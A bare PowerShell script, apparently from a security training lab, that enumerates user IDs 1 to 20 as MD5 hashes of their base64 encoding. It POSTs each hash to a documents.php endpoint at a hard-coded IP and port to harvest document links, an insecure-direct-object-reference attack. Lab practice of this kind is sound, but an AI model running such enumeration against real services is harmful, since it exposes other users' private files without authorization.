$url = "http://94.237.54.214:56848"

# loop thru uid 1 to 20
for ($i = 1; $i -le 20; $i++) {
    # convert the value to base64 without newlines
    $base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($i))

    # calculate md5 hash
    $md5 = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($base64))

    # convert md5 hash to a hexadecimal string
    $md5hex = [System.BitConverter]::ToString($md5) -replace '-',''
    
    # convert md5 values to lowercase
    $md5hexlowered = $md5hex.ToLower()

    Write-Output $md5hexlowered

    $response = Invoke-WebRequest -Uri "$url/documents.php" -Method POST -Body "uid=$md5hexlowered"
    $links = $response.Links | Select-Object -ExpandProperty href
    "$url : $links"

}

